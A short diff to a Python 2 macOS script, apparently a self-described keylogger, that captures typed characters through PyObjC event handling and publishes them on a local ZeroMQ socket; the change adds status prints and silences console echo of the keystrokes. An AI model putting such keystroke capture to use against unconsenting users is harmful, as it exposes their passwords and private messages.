@@ -12,6 +12,7 @@ import zmq
 context = zmq.Context()
 socket = context.socket(zmq.PUB)
 socket.bind("tcp://127.0.0.1:5000")
+print "Keylogger: Socket initialized"
 
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
@@ -24,7 +25,7 @@ def handler(event):
         #print event
         #print event.keyCode()
         socket.send_string(event.characters())
-        print event.characters()
+        #print event.characters()
         
     except KeyboardInterrupt:
         AppHelper.stopEventLoop()
@@ -34,6 +35,7 @@ def main():
     app = NSApplication.sharedApplication()
     delegate = AppDelegate.alloc().init()
     NSApp().setDelegate_(delegate)
+    print "Keylogger: Logging starting"
     AppHelper.runEventLoop()
     
 if __name__ == '__main__':
